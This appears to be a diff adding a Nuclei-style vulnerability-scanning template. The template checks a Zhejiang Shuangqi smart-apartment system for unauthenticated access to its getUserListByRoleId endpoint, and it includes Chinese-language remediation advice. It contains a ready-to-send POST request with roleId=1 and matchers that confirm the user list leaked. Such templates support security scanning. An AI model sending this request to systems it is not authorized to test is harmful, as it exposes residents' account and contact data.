@@ -1,0 +1,43 @@
+id: shuangqi-getuserlistbyroleid-unauthorized
+
+info:
+  name: 浙江双旗智慧公寓系统getUserListByRoleId接口未授权访问
+  author: qwtd
+  severity: high
+  description: |-
+    浙江双旗智慧公寓系统getUserListByRoleId接口缺少访问控制，导致未授权访问，攻击者可远程获取用户列表信息。
+  remediation: |
+    1. 对 getUserListByRoleId 接口增加身份认证校验，禁止未登录用户直接访问。
+    2. 对接口请求增加权限验证，根据用户角色判断是否具备访问用户列表的权限。
+    3. 对敏感接口启用访问控制策略，避免通过修改接口路径或参数绕过权限限制。
+    4. 对返回数据进行脱敏处理，避免泄露用户账号、手机号等敏感信息。
+    5. 建议对系统进行安全审计，排查其他存在未授权访问风险的接口。
+  classification:
+    cwe-id: CWE-306
+  metadata:
+    verified: true
+    max-request: 1
+  tags: 双旗智慧-智慧公寓管理系统
+
+http:
+  - raw:
+      - |
+        POST /appsys/sys/user/getUserListByRoleId HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Length: 8
+
+        roleId=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"userList\""
+          - "\"msg\""
+          - "\"code\":"
+        condition: and
